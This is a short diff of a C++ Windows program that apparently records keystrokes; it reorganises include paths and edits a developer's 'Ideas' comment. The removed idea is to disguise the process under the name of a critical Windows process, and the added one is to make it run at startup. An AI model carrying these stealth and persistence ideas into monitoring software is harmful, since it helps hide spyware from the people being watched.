@@ -9,9 +9,9 @@
 *    static_cast conversion method, then closes the file.
 */
 
-#include "mappings.h"
-#include "constants.h"
-#include "find_shift_keys.h"
+#include "core/mappings.h"
+#include "core/constants.h"
+#include "core/find_shift_keys.h"
 
 #include <windows.h>
 #include <iostream>
@@ -78,5 +78,5 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     Ideas
 
-    ~ find a way to run the process under a spoofed name. Something similar to crucial windows process. 
+    ~ write code to make it create a task that runs on startup. 
 */
